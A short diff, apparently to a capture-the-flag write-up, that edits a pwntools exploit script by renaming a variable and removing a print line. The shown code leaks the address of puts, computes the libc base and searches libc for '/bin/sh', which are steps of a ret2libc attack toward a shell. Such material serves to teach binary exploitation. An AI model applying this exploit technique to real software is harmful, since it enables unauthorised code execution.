@@ -49,9 +49,9 @@ p.sendline(paylaod1)
 
 p.recv()
 
-l = p.recv()[49:56]
+leak = p.recv()[49:56]
 
-puts_leak = u64(l.strip().ljust(8, "\x00"))
+puts_leak = u64(leak.strip().ljust(8, "\x00"))
 
 print(hex(puts_leak))
 ```
@@ -103,13 +103,11 @@ p.sendline(paylaod1)
 
 p.recv()
 
-l = p.recv()[49:56]
+leak = p.recv()[49:56]
 
-puts_leak = u64(l.strip().ljust(8, "\x00"))
+puts_leak = u64(leak.strip().ljust(8, "\x00"))
 
 libc.address = puts_leak - libc.symbols['puts']
-
-print(hex(puts_leak))
 
 binsh = next(libc.search("/bin/sh"))
 
